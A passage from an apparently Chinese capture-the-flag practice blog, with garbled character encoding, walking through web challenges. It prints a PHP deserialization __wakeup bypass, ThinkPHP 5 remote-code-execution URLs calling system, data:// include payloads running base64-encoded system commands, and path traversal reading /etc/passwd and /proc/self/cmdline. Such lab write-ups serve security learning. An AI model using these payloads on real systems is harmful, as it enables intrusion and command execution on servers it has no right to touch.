</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$str2</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;:1:&#39;</span><span class="p">,</span> <span class="s1">&#39;:2:&#39;</span><span class="p">,</span><span class="nv">$str1</span><span class="p">);</span><span class="c1">//ç»•è¿‡wakeup
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$str2</span><span class="p">);</span><span class="c1">//string(49) &#34;O:+4:&#34;Demo&#34;:2:{s:10:&#34;Demofile&#34;;s:8:&#34;fl4g.php&#34;;}&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$str2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250112154716210.png"
	width="937"
	height="122"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250112154716210_hu4221936664075490196.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250112154716210_hu10902609738301618055.png 1024w"
	loading="lazy"
	
		alt="image-20250112154716210"
	
	
		class="gallery-image" 
		data-flex-grow="768"
		data-flex-basis="1843px"
	
></p>
<p>ç»™varä¼ base64ç å°±è¡Œäº†</p>
<h2 id="php_rce">php_rce
</h2><p>è¿›å»å‘ç°æ˜¯thinkphp5æ¡†æ¶ï¼Œå»githubä¸Šæ‰¾</p>
<p>å¤šè¯•è¯•payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">6</span><span class="err">ã€</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="o">/</span><span class="n">thinkphp_5</span><span class="o">.</span><span class="mf">0.21</span><span class="o">/</span><span class="err">?</span><span class="n">s</span><span class="o">=</span><span class="n">index</span><span class="o">/</span>\<span class="n">think</span>\<span class="n">app</span><span class="o">/</span><span class="n">invokefunction</span><span class="o">&amp;</span><span class="n">function</span><span class="o">=</span><span class="n">call_user_func_array</span><span class="o">&amp;</span><span class="n">vars</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="n">system</span><span class="o">&amp;</span><span class="n">vars</span><span class="p">[</span><span class="mi">1</span><span class="p">][]</span><span class="o">=</span><span class="n">id</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="err">ã€</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="o">/</span><span class="n">thinkphp_5</span><span class="o">.</span><span class="mf">0.21</span><span class="o">/</span><span class="err">?</span><span class="n">s</span><span class="o">=</span><span class="n">index</span><span class="o">/</span>\<span class="n">think</span>\<span class="n">app</span><span class="o">/</span><span class="n">invokefunction</span><span class="o">&amp;</span><span class="n">function</span><span class="o">=</span><span class="n">call_user_func_array</span><span class="o">&amp;</span><span class="n">vars</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="n">phpinfo</span><span class="o">&amp;</span><span class="n">vars</span><span class="p">[</span><span class="mi">1</span><span class="p">][]</span><span class="o">=</span><span class="mi">1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨[]åè¾“å‘½ä»¤å°±è¡Œ</p>
<p>lsæ²¡å‘ç°flag</p>
<p>find / -name &ldquo;flag*&rdquo;</p>
<p>æ‰¾åˆ°flag</p>
<p>æˆ–è€…ä¸€ç›´è·³ç›®å½•</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250112160044624.png"
	width="1204"
	height="805"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250112160044624_hu17898567564985901148.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250112160044624_hu6372897803905053158.png 1024w"
	loading="lazy"
	
		alt="image-20250112160044624"
	
	
		class="gallery-image" 
		data-flex-grow="149"
		data-flex-basis="358px"
	
></p>
<h2 id="web_php_include">Web_php_include
</h2><p>è¿‡æ»¤php://</p>
<p>ç”¨å¤§å†™ç»•è¿‡PHP://</p>
<p>postä¼ ä¸€å¥è¯</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250113174925061.png"
	width="1499"
	height="780"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250113174925061_hu5577768482629229566.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250113174925061_hu2256598635289201254.png 1024w"
	loading="lazy"
	
		alt="image-20250113174925061"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="461px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250113174938813.png"
	width="1494"
	height="753"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250113174938813_hu8893580363183129689.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250113174938813_hu4761288757948671547.png 1024w"
	loading="lazy"
	
		alt="image-20250113174938813"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="476px"
	
></p>
<p>ç”¨data://åè®®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ä½¿ç”¨æ–¹æ³•data://text/plain;base64;base64ç¼–ç åçš„å‘½ä»¤
</span></span><span class="line"><span class="cl">&lt;?php system(&#34;dir&#34;)?&gt; base64ç¼–ç åä½¿ç”¨
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIisssKT8%2b  (æ³¨æ„ç¼–ç åçš„+å·è¦URLç¼–ç )
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;?php system(&#34;cat fl4gisisish3r3.php&#34;)?&gt; base64ç¼–ç åä½¿ç”¨
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==
</span></span><span class="line"><span class="cl">æˆ–è€…ä¼ ä¸€å¥è¯æœ¨é©¬è¿æ¥
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="catcat-new">catcat-new
</h2><p>å‰ç½®çŸ¥è¯†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/etc/passwd
</span></span><span class="line"><span class="cl">è¯¥æ–‡ä»¶å‚¨å­˜äº†è¯¥Linuxç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œåªæœ‰rootæƒé™æ‰å¯ä»¥ä¿®æ”¹ã€‚å…¶å…·ä½“æ ¼å¼ä¸º      ç”¨æˆ·å:å£ä»¤:ç”¨æˆ·æ ‡è¯†å·:ç»„æ ‡è¯†å·:æ³¨é‡Šæ€§æè¿°:ä¸»ç›®å½•:ç™»å½•Shellï¼ˆä»¥å†’å·ä½œä¸ºåˆ†éš”ç¬¦ï¼‰
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/proc/self
</span></span><span class="line"><span class="cl">procæ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒæä¾›äº†å†…æ ¸æ•°æ®ç»“æ„çš„æ¥å£ã€‚å†…æ ¸æ•°æ®æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶å­˜å‚¨åœ¨å†…éƒ¨åŠå¯¼ä½“å­˜å‚¨å™¨ä¸­æ•°æ®ã€‚é€šè¿‡/proc/PIDå¯ä»¥è®¿é—®å¯¹åº”PIDçš„è¿›ç¨‹å†…æ ¸æ•°æ®ï¼Œè€Œ/proc/selfè®¿é—®çš„æ˜¯å½“å‰è¿›ç¨‹çš„å†…æ ¸æ•°æ®ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/proc/self/cmdline
</span></span><span class="line"><span class="cl">è¯¥æ–‡ä»¶åŒ…å«çš„å†…å®¹ä¸ºå½“å‰è¿›ç¨‹æ‰§è¡Œçš„å‘½ä»¤è¡Œå‚æ•°ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/proc/self/mem
</span></span><span class="line"><span class="cl">/proc/self/memæ˜¯å½“å‰è¿›ç¨‹çš„å†…å­˜å†…å®¹ï¼Œé€šè¿‡ä¿®æ”¹è¯¥æ–‡ä»¶ç›¸å½“äºç›´æ¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜æ•°æ®ã€‚ä½†æ˜¯æ³¨æ„è¯¥æ–‡ä»¶ä¸èƒ½ç›´æ¥è¯»å–ï¼Œå› ä¸ºæ–‡ä»¶ä¸­å­˜åœ¨ç€ä¸€äº›æ— æ³•è¯»å–çš„æœªè¢«æ˜ å°„åŒºåŸŸã€‚æ‰€ä»¥è¦ç»“åˆ/proc/self/mapsä¸­çš„åç§»åœ°å€è¿›è¡Œè¯»å–ã€‚é€šè¿‡å‚æ•°startå’ŒendåŠåç§»åœ°å€å€¼è¯»å–å†…å®¹ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/proc/self/maps
</span></span><span class="line"><span class="cl">/proc/self/mapsåŒ…å«çš„å†…å®¹æ˜¯å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„å…³ç³»ï¼Œå¯é€šè¿‡è¯»å–è¯¥æ–‡ä»¶æ¥å¾—åˆ°å†…å­˜æ•°æ®æ˜ å°„çš„åœ°å€ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">flask-sessionç»“æ„
</span></span><span class="line"><span class="cl"> flask_sessionæ˜¯flaskæ¡†æ¶å®ç°sessionåŠŸèƒ½çš„ä¸€ä¸ªæ’ä»¶ã€‚å…¶sessionç»“æ„åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼šåºåˆ—åŒ–å†…å®¹+æ—¶é—´+é˜²ç¯¡æ”¹å€¼ï¼Œè¿™ä¸‰éƒ¨åˆ†å†…å®¹åŠ å¯†åä»¥ç¬¦å· â€œ.â€æ¥è¿›è¡Œåˆ†éš”ã€‚flask_sessioné»˜è®¤sessionçš„å‚¨å­˜æ˜¯åœ¨ç”¨æˆ·Cookieä¸­ã€‚ä½†ä¹Ÿå¯ä»¥æŒ‡å®šå­˜å‚¨åœ¨æ•°æ®åº“ï¼Œç¼“å­˜ä¸­é—´ä»¶ï¼ŒæœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ç­‰ç­‰ä¹‹ä¸­ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é¢˜è®¿é—®ç½‘é¡µï¼Œçœ‹åˆ°ä¸Šé¢æœ‰?file=ï¼Œæƒ³åˆ°æ–‡ä»¶åŒ…å«</p>
<p>å°è¯•è®¿é—®etc/passwdï¼Œè·³äº†å¤šçº§ç›®å½•å‘ç°ç¡®å®è®¿é—®åˆ°äº†</p>
<p>è¯»å–å½“å‰è¿›ç¨‹çš„å‘½ä»¤è¡Œå‚æ•°?file=../../../../proc/self/cmdlineï¼Œå‘ç°æœ‰ä¸€ä¸ªé€šè¿‡pythonå¯åŠ¨app.pyçš„å‘½ä»¤</p>
<p>æœ‰app.pyåˆ¤æ–­è¿™é¢˜æ˜¯flaskæ¡†æ¶</p>
<p>è¯»å–app.py</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250116201011307.png"
	width="1589"
	height="857"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250116201011307_hu16099123147062481225.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250116201011307_hu7728297641785000982.png 1024w"
	loading="lazy"
	
		alt="image-20250116201011307"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="444px"
	
></p>
<p>è½¬æ¢æ ¼å¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># éœ€è¦æ ¼å¼åŒ–çš„ä»£ç </span>
</span></span><span class="line"><span class="cl"><span class="n">code_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;import os</span><span class="se">\n</span><span class="s1">import uuid</span><span class="se">\n</span><span class="s1">from flask import Flask, request, session, render_template, Markup</span><span class="se">\n</span><span class="s1">from cat import cat</span><span class="se">\n\n</span><span class="s1">flag = &#34;&#34;</span><span class="se">\n</span><span class="s1">app = Flask(</span><span class="se">\n</span><span class="s1">    __name__,</span><span class="se">\n</span><span class="s1">    static_url_path=</span><span class="se">\&#39;</span><span class="s1">/</span><span class="se">\&#39;</span><span class="s1">, </span><span class="se">\n</span><span class="s1">    static_folder=</span><span class="se">\&#39;</span><span class="s1">static</span><span class="se">\&#39;</span><span class="s1"> </span><span class="se">\n</span><span class="s1">)</span><span class="se">\n</span><span class="s1">app.config[</span><span class="se">\&#39;</span><span class="s1">SECRET_KEY</span><span class="se">\&#39;</span><span class="s1">] = str(uuid.uuid4()).replace(&#34;-&#34;, &#34;&#34;) + &#34;*abcdefgh&#34;</span><span class="se">\n</span><span class="s1">if os.path.isfile(&#34;/flag&#34;):</span><span class="se">\n</span><span class="s1">    flag = cat(&#34;/flag&#34;)</span><span class="se">\n</span><span class="s1">    os.remove(&#34;/flag&#34;)</span><span class="se">\n\n</span><span class="s1">@app.route(</span><span class="se">\&#39;</span><span class="s1">/</span><span class="se">\&#39;</span><span class="s1">, methods=[</span><span class="se">\&#39;</span><span class="s1">GET</span><span class="se">\&#39;</span><span class="s1">])</span><span class="se">\n</span><span class="s1">def index():</span><span class="se">\n</span><span class="s1">    detailtxt = os.listdir(</span><span class="se">\&#39;</span><span class="s1">./details/</span><span class="se">\&#39;</span><span class="s1">)</span><span class="se">\n</span><span class="s1">    cats_list = []</span><span class="se">\n</span><span class="s1">    for i in detailtxt:</span><span class="se">\n</span><span class="s1">        cats_list.append(i[:i.index(</span><span class="se">\&#39;</span><span class="s1">.</span><span class="se">\&#39;</span><span class="s1">)])</span><span class="se">\n\n</span><span class="s1">    return render_template(&#34;index.html&#34;, cats_list=cats_list, cat=cat)</span><span class="se">\n\n\n\n</span><span class="s1">@app.route(</span><span class="se">\&#39;</span><span class="s1">/info</span><span class="se">\&#39;</span><span class="s1">, methods=[&#34;GET&#34;, </span><span class="se">\&#39;</span><span class="s1">POST</span><span class="se">\&#39;</span><span class="s1">])</span><span class="se">\n</span><span class="s1">def info():</span><span class="se">\n</span><span class="s1">    filename = &#34;./details/&#34; + request.args.get(</span><span class="se">\&#39;</span><span class="s1">file</span><span class="se">\&#39;</span><span class="s1">, &#34;&#34;)</span><span class="se">\n</span><span class="s1">    start = request.args.get(</span><span class="se">\&#39;</span><span class="s1">start</span><span class="se">\&#39;</span><span class="s1">, &#34;0&#34;)</span><span class="se">\n</span><span class="s1">    end = request.args.get(</span><span class="se">\&#39;</span><span class="s1">end</span><span class="se">\&#39;</span><span class="s1">, &#34;0&#34;)</span><span class="se">\n</span><span class="s1">    name = request.args.get(</span><span class="se">\&#39;</span><span class="s1">file</span><span class="se">\&#39;</span><span class="s1">, &#34;&#34;)[:request.args.get(</span><span class="se">\&#39;</span><span class="s1">file</span><span class="se">\&#39;</span><span class="s1">, &#34;&#34;).index(</span><span class="se">\&#39;</span><span class="s1">.</span><span class="se">\&#39;</span><span class="s1">)]</span><span class="se">\n\n</span><span class="s1">    return render_template(&#34;detail.html&#34;, catname=name, info=cat(filename, start, end))</span><span class="se">\n\n\n\n</span><span class="s1">@app.route(</span><span class="se">\&#39;</span><span class="s1">/admin</span><span class="se">\&#39;</span><span class="s1">, methods=[&#34;GET&#34;])</span><span class="se">\n</span><span class="s1">def admin_can_list_root():</span><span class="se">\n</span><span class="s1">    if session.get(</span><span class="se">\&#39;</span><span class="s1">admin</span><span class="se">\&#39;</span><span class="s1">) == 1:</span><span class="se">\n</span><span class="s1">        return flag</span><span class="se">\n</span><span class="s1">    else:</span><span class="se">\n</span><span class="s1">        session[</span><span class="se">\&#39;</span><span class="s1">admin</span><span class="se">\&#39;</span><span class="s1">] = 0</span><span class="se">\n</span><span class="s1">        return &#34;NoNoNo&#34;</span><span class="se">\n\n\n\n</span><span class="s1">if __name__ == </span><span class="se">\&#39;</span><span class="s1">__main__</span><span class="se">\&#39;</span><span class="s1">:</span><span class="se">\n</span><span class="s1">    app.run(host=</span><span class="se">\&#39;</span><span class="s1">0.0.0.0</span><span class="se">\&#39;</span><span class="s1">, debug=False, port=5637)&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æŒ‰è¡Œåˆ†å‰²å­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl"><span class="n">lines</span> <span class="o">=</span> <span class="n">code_str</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">indented_lines</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span> <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">else</span> <span class="s1">&#39;&#39;</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¿æ¥å¹¶æ‰“å°æ ¼å¼åŒ–åçš„ä»£ç </span>
</span></span><span class="line"><span class="cl"><span class="n">formatted_code</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">indented_lines</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">formatted_code</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">Markup</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cat</span> <span class="kn">import</span> <span class="n">cat</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="vm">__name__</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">static_url_path</span><span class="o">=</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="n">static_folder</span><span class="o">=</span><span class="s1">&#39;static&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;*abcdefgh&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">cat</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">detailtxt</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s1">&#39;./details/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">cats_list</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">detailtxt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cats_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">[:</span><span class="n">i</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">cats_list</span><span class="o">=</span><span class="n">cats_list</span><span class="p">,</span> <span class="n">cat</span><span class="o">=</span><span class="n">cat</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/info&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">info</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="s2">&#34;./details/&#34;</span> <span class="o">+</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;start&#39;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">end</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;end&#39;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)[:</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;detail.html&#34;</span><span class="p">,</span> <span class="n">catname</span><span class="o">=</span><span class="n">name</span><span class="p">,</span> <span class="n">info</span><span class="o">=</span><span class="n">cat</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin_can_list_root</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;NoNoNo&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5637</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¦sessionä¸­admin=1çš„ç”¨æˆ·æ‰èƒ½è®¿é—®/adminæ‰èƒ½æ‹¿åˆ°flag</p>
